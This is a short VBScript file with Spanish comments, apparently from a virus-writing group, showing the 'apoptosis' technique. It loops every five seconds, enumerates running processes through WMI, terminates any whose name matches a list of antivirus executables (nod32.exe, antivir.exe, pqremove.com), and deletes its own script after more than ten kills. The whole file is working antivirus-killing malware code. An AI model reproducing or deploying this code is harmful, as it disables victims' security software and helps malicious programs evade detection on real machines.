'// Apoptósis - La teoría de los retrovirus
'// by Falckon/GeDzAC
'// Example in VBS
'// En este ejemplo demuestro la utilización de la apoptósis
'// en vbs, buscando por procesos antivirales :D
On Error Resume Next  '/Control de errores (importante!)
Dim gObject,iFor,Contador

  
Do  '/Inicio del Do
                '/esperamos 5 segundos, así logramos hacer un Timer
Dormir(5000)
'/Microsoft Windows Management Instrumentation  (WMI) 
'/Hacemos un For para extraer todos los procesos
For Each iFor in  GetObject("winmgmts:{impersonationLevel=impersonate}").InstancesOf("Win32_Process")
                                    'Llamamos a la funcion ProcesosAV pasandole el nombre del proceso
If ProcesosAV(iFor.Name) = true Then
                                    '/Entonces ya que comprobamos que existe el AV terminamos su ejecución
iFor.Terminate()
                                    '/Aumentamos Contador en uno
Contador = Contador + 1
                                    '/Si Contador es mayor a 10 entonces..
If Contador > 10 then
Dim Fso
Set Fso = CreateObject("Scripting.FileSystemObject")
                                    '/Autodestruimos nuestro script
Fso.DeleteFile Wscript.ScriptFullName
End if
End if
Next
Loop

Function Dormir(segundos)
                            'Function que duerme unos segundos el Do-Loop
Wscript.Sleep(segundos)
End Function

Function ProcesosAv(ExE)
'/Esta funcion busca los procesos puestos en un array
'/y si alguno es igual al que se pasó a la funcion
'/devuelve true

Dim AVArray,FProcess
                             '/Array con los nombrs de los procesos a buscar
AVArray = Array("pqremove.com","nod32.exe","antivir.exe")
                             '/Extraemos los nombres del array
For Each FProcess in AVArray
                             '/Si algun proceso es igual al que se extrajo entonces
If FProcess = LCase(ExE) Then
                             '/ProcesosAV es igual a verdadero / Detectado el antivirus!
ProcesosAV = True
Else 
                             '/ PrcesosAV es falso
ProcesosAV = False
End if                       ' /Fin de IF
next '/fin de next
End Function
'//nota: este ejemplo no es funcional en Win98
'//tested in WinXP build 2600